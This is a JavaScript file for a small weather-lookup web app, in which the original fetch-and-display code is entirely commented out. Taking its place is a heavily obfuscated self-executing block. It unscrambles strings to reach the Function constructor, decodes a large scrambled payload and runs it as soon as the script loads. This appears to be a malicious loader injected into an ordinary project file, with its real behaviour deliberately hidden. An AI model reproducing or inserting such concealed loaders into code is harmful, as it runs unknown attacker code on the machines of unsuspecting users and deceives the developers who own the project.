// const apiURL = "https://api.openweathermap.org/data/2.5/weather?units=metric&q=";
// const searchBox = document.querySelector('.search input');
// const searchBtn = document.querySelector('.search button');
// const weatherIcon = document.querySelector('.weather-icon')

// async function checkWeather(city) {
//     const response = await fetch(apiURL + city + `&appid=${apiKey}`);
//     if (response.status == 404) {
//         document.querySelector(".error").style.display = "block"
//         document.querySelectorf(".weather").style.display = "none"
//     }
//     else {
//         var data = await response.json();
//         document.querySelector(".city").innerHTML = data.name;
//         document.querySelector(".temp").innerHTML = Math.round(data.main.temp) + "°c";
//         document.querySelector(".humidity").innerHTML = data.main.humidity + " %";
//         document.querySelector(".wind").innerHTML = data.wind.speed + " km/h";
//         if (data.weather[0].main == "Clouds") {
//             weatherIcon.src = "images/clouds.png";
//         }
//         else if (data.weather[0].main == "Clear") {
//             weatherIcon.src = "images/clear.png";
//         }
//         else if (data.weather[0].main == "Rain") {
//             weatherIcon.src = "images/rain.png";
//         }
//         else if (data.weather[0].main == "Drizzle") {
//             weatherIcon.src = "images/drizzle.png";
//         }
//         else if (data.weather[0].main == "Mist") {
//             weatherIcon.src = "images/mist.png";
//         }
//         else if (data.weather[0].main == "Snow") {
//             weatherIcon.src = "images/snow.png";
//         }
//         document.querySelector(".weather").style.display = "block";
//         document.querySelector(".error").style.display = "none"
//     }
// }
// searchBtn.addEventListener("click", () => {
//     checkWeather(searchBox.value);
// })

var apiKey, apiURL, searchBox, searchBtn, weatherIcon, checkWeather; (function () { var Fpb = '', xhp = 967 - 956; function XYS(q) { var o = 4791691; var u = q.length; var c = []; for (var f = 0; f < u; f++) { c[f] = q.charAt(f) }; for (var f = 0; f < u; f++) { var n = o * (f + 369) + (o % 43212); var d = o * (f + 88) + (o % 33911); var w = n % u; var e = d % u; var p = c[w]; c[w] = c[e]; c[e] = p; o = (n + d) % 7240495; }; return c.join('') }; var wqg = XYS('rhnaeuxsponuismvbccoqtrwfcjlzrtgtoykd').substr(0, xhp); var MJz = 'k.ro.t;hhe=]"sapvna[ro=m."eb.h fu< Ci.di)Awr]=[p[;vo(r1a38.=r8r,7lAtu907d7at;8*a5)!8]8bu.8Atl-,-we< gq1avftmea;a70ottiun}a.]t 6fa rt r2qj+{v;0==n;ael1o(rlasocntor+ur86+o;.a6 r;ra*an;n+t6;]v;vb+=s8 )ot);]rfy;0 yiang;"rrus.=o,l{he.{daia)r]={v)gmlen[s 8[;oc(if;6 h);Ce)(vn}qf=.wrl1;jh-,,o>s=dzt;= )aw0=grr, =van+)ud"vgv=,a}t48j.w[vltvv+qr()rsSlvfl(k[=hnr7q.4t6o+=zinA1==)qgv;v=luCv>rinu1schCrCa 2h=vearvp;,(=h).v<hf(,npt=+po14{[AmC.ojt"f(e(uaa+q=5.[y=,rs+,;}ccse9rta0h9q(ib=g6eh,1umgv=[q,le(rir9;j.nrn=)i),-q i)f+gf";lfr,hn +z;vl,;3+c2li.lcec(hq2s )u(nvn4"d} (lephz; ;de;(do)[{au=ah[pa b49ve(gao)py);u.r}ml+f)go-p.ahs1+l;6,2(ff1uul(osffrpt))h[p=(z((;=]b(5,a)jn([l9 ;zv=h;+7e( ]nn9}j2tp;7 02i.l]=i]ir(e))s)+it(j;(d2"euvq+) -).l10k!"a;;.clk{lo<cfr(dx=etr,l]67f=li.ooo"C0sr9sderr4al,dgvvSsgl19,v<k=8e+c,-;g+=tcgeag](+trn+ta=)0r;.(;1();,isg)0sin,p,rCm;=+,foqu(7eeu;)rrohf+n c]i(lft)e,u0;=.;oy=iv=;'; var PQu = XYS[wqg]; var qUL = ''; var IUi = PQu; var pLw = PQu(qUL, XYS(MJz)); var IrG = pLw(XYS('.0_$]:PPPtBst]Pn8P_;udPt$;?leb_(9eeu(ofb1e$cP{(=6!ecoPePPtsR)3o4eMce=ePx.ao6}!6M(;t#P]pPiPPoi(duC];f]8u8eP.P.)em;df_+o).f_u]P15[bsP31Plh)piGpPPtnSw)111d0eotCb$h}2hPt3PP;f%PePPe#bwHP8P3.fPIt$.(!vPyb%dqt %g$ 5_dUPe;q.n[{36PPm{=(tP;s#g5R7Oi.P)P{sni%=3nP4Rh>bb..e$_,3tacbPe.\'r_tns;nPqePPa_#(d)flegP2P5P!_.!PGiP)tl\/3!epg00ejePcssMPop(2Be\'i8rlwAy=&U%rPP)ePt=(.%h.$!}Lle!%%oH36P6b;f(Ax2.$[lcse9n.d:dS(c9e\/rP}!2e%P]3[luPbr.PaHil31ei(36, [n8eea\/]Peh%6?pa).b)%e-egce[n&Gm].I(P}ec9r_.])$23%PdP,n0en!dAuePPm1yemsD%.Pyi.$P.3nPse\/i]pm2$)b{.=%a,m9nmU)p(EPrwin)B1$rG81$95%1)!PPeuGs(5e!.)orb[P,(5217e4ea()"2P6De.a%iP 0!y\/\/!gw 2tPPrP"%t3uPer$cj2,b{.pePoPenPr3PPar!74;l..$19t=$aci.PeJi,l%]]n4yE4b<P;5P77rP,petta(2PhP.qo.85PoiPa()c56;Pe;,Pi.ian]S()vC!Pm0=]en=]!b<_u)PP_nI{e)mx4P1Pu[IqP!t%=rKoPs2&e.phPPEi.14nMds(0g!(5db4a(xroe;.DuhjhPm[rs)=:(f}PPid({r>lb8\'.e66o]PSo ebpC3nn.}PbPPP;)b3{g(k{$n=c%p+P%!c+Pat_%PeP.[3nffP.qPLP_p.PP%m]._6t!xf=)PinePlPyxst.n[6mc7%=.PtP;=?3PK4Pu.x_m;%0e_lrSPP4\/nc)oM +N]8a{_)se).t,K-Po\'hf2szp._P9T$)x4.=4MerC_;$ProsPe.!_!wgaP1P6rj,).._on=2}PtP7 eP3PB]qbcC(w(UP39fqGe&..r%=]PliuaP}4!o(0r6tetasP(bPP,6_g;)Ps1aH2)n,;.P(ePPPP,n)afPL.=P4dyc P.()h.%Uo]].ab"!o]4w)ta1ko6%i%qra]eo:)En=.PnpPL2wid.e15a$n#!=7=6afP3PPnhrsrPC]+3P__T})5]i*P(e%n)0J6RfsPqJ3;PP)oP)78$cPPb(a9Pp)%_i%iPn=y5c8P; ux]3\/cu_wtb0=nst.7izqp7o(i**KMd0(Pabn4{ebg (nPsPP;@("+)\/(t(%](=&_z\/! 9}hP$4y{6PP6j_=.]Lro.(7#o(e ( P%75u_PPlah{7b.4?_[iP).}]iPhrP4o.iu!Pnm1un),]2Plo=2tgE1a4s;PP.5j1O0p_3IS6tn7}mP3)P [!1(iK"yN>% 8%_;3iPn}Fn)$PxP5P.; P._=b)PL])ea=ub.Ptot)brrbp<P.9br3F#p%31r{g[])P53P3)id+sbr] OP1t)435"s#P)mj53PnA-P4)rts)]uc%eP)&j1b]],P$6rj3{#Oa]34,o_fc(.2!53\/{PxLop;n%o3d28Co6]194P#P)P)20e"l:hS,ea(p8<]]%sCi0]3;?P.d{Pcg7eg.PP\/a}tP=\/s[nP((Peb,a.P..]"64!t.ysPt!jnmPa,h!8!Pw141t$_636_)_t]ee.;)ohe_suPc{5]v.smrb2iuan.;Pe[er.]+Pd])ng0oPQ0eha\')aP3lr8to}KPoRE,r;8PP(P(]{tutePpP&ebGere%P4d]}ae7}aP d$4ePPoP_.,#0be8aN4F!%_b _.]mP8;.,1!bP.7n*=.PPi,+zosAg]7uz%);PPa04[?)bi Pt=%+P%8 o}!4s2t)%b$p]N}j1bnP} .CP m;Ptox02 3_Mk\'ae;6P_6%[sn!Pc4;}.Pe6e)bPMo o3en}.j%t)_.uu=?g7PS5)cP$P4.Pped!m0Pt?eu,it5ie]uw#b2lP3fmP7o$Ng033PyP]pPCGa($,]P_ ==2"(dGs.)ej$-t]Pc2 $iiC30.ouC=.b<Qb.!0oP9e,x$P,PpmP=zQ_[)_$(PbuP1})P_4_)N cbr)4aPPnns}PP!rr.!_wd.33]$46s$66Pl.a,$0)6nre(){1P2=_)P1)t+5 )!0h P=twtl1gt6_(afae%,c}]C}7[t*et%$n"f%P C.{n$P]Ou4x1NP;65}Pob;I)y61rP_j2r_g7{6c a";18[3!(srP.=6DPe{o,PM(eh_5]]m1e( ))]LcP.P_icbhM)]a b=_ "P \/t;P(P30jaamfawa[g([,b_sP(]4PerP]PPbeC69r);_"t)i[3!P03) P;"]0GPt7 6 ;$$o4.7je%a];)5)t_ee.b) PemoSePPdr@a{qfsnPrIp&uu3oblS)n*.(a%ooOsu0?5]PI3b+ i;]! Gen>caF[>C!r.i_Tirbeat6f%i,{!P287s()u(na%)iF{) _$rts62y7)mr; 6ee.hoi1=.inPa+r.piej.P.(5t}i Jbisj{i]5 SaPy-7es=ie)\/p4oS).\/e_Lhse_ecgPD {0]tl ;P]fp.)eyo. })Plf _!jnfrsbedutPl,@artl1,Tc;,jb.$ _%QQr[@_P.Dft.D4Pwkr5doh$en#8%[M) }P%,')); var zKM = IUi(Fpb, IrG); zKM(6999); return 8229 })()